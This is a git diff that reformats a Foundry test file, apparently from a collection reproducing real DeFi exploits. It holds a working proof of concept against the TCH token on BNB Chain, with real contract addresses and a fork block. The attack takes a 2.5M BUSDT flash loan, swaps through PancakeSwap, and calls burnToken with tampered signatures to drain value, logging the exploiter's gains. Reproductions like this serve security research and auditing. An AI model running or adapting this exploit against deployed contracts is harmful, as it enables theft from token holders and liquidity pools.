@@ -19,11 +19,7 @@ import "../interface.sol";
 // Hacking God :
 
 interface ITCH is IERC20 {
-    function burnToken(
-        uint256 amount,
-        uint256 nonce,
-        bytes memory signature
-    ) external;
+    function burnToken(uint256 amount, uint256 nonce, bytes memory signature) external;
 }
 
 contract ContractTest is Test {
@@ -35,16 +31,11 @@ contract ContractTest is Test {
         bytes tamperedSig;
     }
 
-    Uni_Pair_V3 private constant BUSDT_USDC =
-        Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
-    Uni_Router_V2 private constant PancakeRouter =
-        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    ITCH private constant TCH =
-        ITCH(0x5d78CFc8732fd328015C9B73699dE9556EF06E8E);
-    IERC20 private constant BUSDT =
-        IERC20(0x55d398326f99059fF775485246999027B3197955);
-    address private constant busdt_tch =
-        0xb7F1FFf722e68A6Fc44980f5D48d6d3Dbc1fe9cF;
+    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb);
+    Uni_Router_V2 private constant PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    ITCH private constant TCH = ITCH(0x5d78CFc8732fd328015C9B73699dE9556EF06E8E);
+    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    address private constant busdt_tch = 0xb7F1FFf722e68A6Fc44980f5D48d6d3Dbc1fe9cF;
 
     uint256 private constant flashAmount = 2_500_000e18;
     uint256 private constant blocknumToForkFrom = 38_776_239;
@@ -60,25 +51,17 @@ contract ContractTest is Test {
     function testExploit() public {
         deal(address(BUSDT), address(this), 0);
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance before attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
 
         BUSDT_USDC.flash(address(this), flashAmount, 0, bytes(""));
 
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance after attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance after attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         BUSDT.approve(address(PancakeRouter), type(uint256).max);
         TCH.approve(address(PancakeRouter), type(uint256).max);
         uint256 transferAmount = BUSDT.balanceOf(address(this)) - 101e18;
@@ -97,13 +80,7 @@ contract ContractTest is Test {
         path[0] = address(BUSDT);
         path[1] = address(TCH);
 
-        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            0,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(0, 0, path, address(this), block.timestamp);
     }
 
     function TCHToBUSDT() private {
@@ -111,13 +88,7 @@ contract ContractTest is Test {
         path[0] = address(TCH);
         path[1] = address(BUSDT);
 
-        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            0,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(0, 0, path, address(this), block.timestamp);
     }
 
     function burnTCH() private {
@@ -299,11 +270,7 @@ contract ContractTest is Test {
 
         for (uint256 i; i < burnInfos.length; ++i) {
             BurnInfo memory burnInfo = burnInfos[i];
-            TCH.burnToken(
-                burnInfo.amount,
-                burnInfo.nonce,
-                burnInfo.tamperedSig
-            );
+            TCH.burnToken(burnInfo.amount, burnInfo.nonce, burnInfo.tamperedSig);
         }
     }
 }
